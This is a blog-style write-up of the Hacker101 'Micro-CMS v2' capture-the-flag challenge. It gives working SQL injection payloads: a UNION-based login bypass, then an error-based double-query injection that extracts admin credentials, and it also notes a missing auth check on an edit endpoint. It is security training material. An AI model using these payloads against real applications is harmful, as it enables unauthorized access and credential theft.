---
title: 'Hackerone CTF: Micro-CMS v2'
excerpt: 'The trials of a harder-than-advertised sql injection ctf.'
coverImage: '/images/cover-images/hackerone-ctf-micro-cms-v2.jpg'
date: '2020-06-01'
ogImage:
  url: '/images/cover-images/hackerone-ctf-micro-cms-v2.jpg'
---
The other day, I subumitted a bug to hackerone and I noticed they had a [ctf section](https://www.hacker101.com/). They exercises so far are fun, pretty straight forward, and earn you invites to private bug bounty programs.

I wanted to detail my experience with their `Micro-CMS v2` ctf, the second and more advanced ctf following Micro-CMS v1, because it went from easy to what feels like advanced toot sweet. Where Micro-CMS v1 dealt mostly with XSS, v2 mostly deals with SQL injection.

## Finding Flag0
Unlike v1, any action besides viewing pages redirects you to a login page.
![IMG1](/images/hackerone-ctf-micro-cms-v2/one.gif)

If the login code used something like this to authenticate:

~~~SQL
SELECT * FROM users
WHERE name='%s'
and password='%s'
~~~

Then this would have worked...
![IMG2](/images/hackerone-ctf-micro-cms-v2/two.gif)

But it did not. And it's back to the drawing board.
![IMG3](/images/hackerone-ctf-micro-cms-v2/three.gif)

My first break came when I put a simple singular quote in the user name (`username='`) and submitted. It spit out the following error.
~~~Python
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
~~~

Now we know the query for authentication:
~~~SQL
SELECT password FROM admins WHERE username='%s'
~~~

And here's the statement that'll get authenticated:
~~~SQL
SELECT password FROM admins WHERE username='' or '0'='1' UNION ALL SELECT '1234'
~~~
![IMG4](/images/hackerone-ctf-micro-cms-v2/four.gif)
The '0'='1' negates the first select and instead returns `1234` as the value of `password`. And it's after successful login that we are given the first flag.


## Finding Flag1
Now, as authorized users, we can edit pages. This is done via POST request on pages with urls like `/page/edit/1`. I did exactly that, then logged out, repeated the same request, having removed the cookie. And jackpot! Looks like the someone forgot to test auth in the edit page's post request logic.
![IMG5](/images/hackerone-ctf-micro-cms-v2/five.gif)


## Finding Flag2
If this was all there was, I don't think I would be writing this up. It's this next flag that was a real brain-wrinkler. The only hint given to us is this: `Credentials are secret, flags are secret. Coincidence?` So it looks like we need to acquire the login and the password.

The only data we can get from the database seems to be either an error when we create an faulty sql command, like the one that exposed the SQL, or when we attempt to log in. But even then we are either successful thru the UNION injection at which point we are redirected and get no information divulged, or 'Unknown user' or 'Invalid Password' when we try to login unsuccessfully.

So how do we retrieve the credentials?

#### Double Query Injection
They key to this technique is the `GROUP BY` modifier. When combined with the aggregate function like count(*) we produce a `Duplicate entry` error that outputs the data we select for.

This looks complicated, but let's make it easier to parse visually:
~~~SQL
' OR (
	SELECT 1 from (
		select count(*), 
		concat((SELECT username FROM admins LIMIT 0,1),'~~~',floor(rand(0)*2)) 
		 as c from information_schema.tables group by c
		) as a
	) 
AND '1' = '1
~~~

And lets break it down some more:
~~~SQL
concat((SELECT username FROM admins LIMIT 0,1),'~~~',floor(rand(0)*2)) 
~~~
This select statement is our payload, so to speak. You could even pass functions `SELECT database()` if you wanted discover other info. In this case, it'll retrieve our username, and one could increase to LIMIT 1,1 to get the username of the next row.

~~~SQL
as c from information_schema.tables group by c
~~~
`information_schema.tables` is used here because it will reliably have enough rows in it to trigger our duplication, we are not actually retrieving any data from this table

~~~SQL
) as a
~~~
`as a` alias is used because we get this error without it:` OperationalError: (1248, 'Every derived table must have its own alias')`

Feeding this string to the username param and POSTing it returns this error from the server:
![IMG6](/images/hackerone-ctf-micro-cms-v2/six.gif)

So here we have our login, `evalina`.

We do the same request except we change the column of the nested SELECT statement from `username` to `password`. Now we have our credentials, we log in, and the flag is ours.